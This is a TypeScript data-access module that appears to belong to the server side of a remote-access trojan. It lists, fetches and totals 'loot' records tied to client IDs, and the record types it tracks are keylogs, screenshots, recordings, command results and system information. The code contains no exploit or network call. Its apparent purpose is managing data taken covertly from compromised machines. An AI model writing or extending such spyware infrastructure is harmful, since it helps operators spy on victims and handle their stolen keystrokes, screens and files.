import { getDatabase } from './db'

export interface LootFile {
  id: string
  name: string
  path: string
  size: number
  type: string
  mtime: string
  client_id: string
}

export async function listLoot(client_id?: string, type?: string): Promise<LootFile[]> {
  const db = await getDatabase()
  const filter: any = {}
  if (client_id) filter.client_id = client_id
  if (type) filter.type = type

  const rows = await db.collection('loot').find(filter).sort({ timestamp: -1 }).toArray() as any[]
  
  return rows.map(row => ({
    id: row._id.toString(),
    name: row.filename,
    path: row.path || row.filename,
    size: row.size || 0,
    type: row.type || 'misc',
    mtime: row.timestamp,
    client_id: row.client_id
  }))
}

export async function getLootContent(id: string): Promise<Buffer | null> {
  const db = await getDatabase()
  const { ObjectId } = require('mongodb')
  
  try {
    const row = await db.collection('loot').findOne({ _id: new ObjectId(id) }) as any
    if (!row || !row.data) return null
    
    // row.data is a Binary in MongoDB, which converts to Buffer in Node
    return row.data.buffer || row.data
  } catch (e) {
    console.error('Error fetching loot data:', e)
    return null
  }
}

export async function getLootStats() {
  const db = await getDatabase()
  
  const pipeline = [
    {
      $group: {
        _id: "$type",
        count: { $sum: 1 },
        size: { $sum: { $ifNull: ["$size", 0] } }
      }
    }
  ]
  
  const results = await db.collection('loot').aggregate(pipeline).toArray()
  const stats: Record<string, { count: number, size: number }> = {
    command_result: { count: 0, size: 0 },
    keylog: { count: 0, size: 0 },
    screenshot: { count: 0, size: 0 },
    system_info: { count: 0, size: 0 },
    recordings: { count: 0, size: 0 }
  }

  results.forEach(res => {
    if (res._id) {
      stats[res._id] = {
        count: res.count,
        size: res.size
      }
    }
  })

  return stats
}
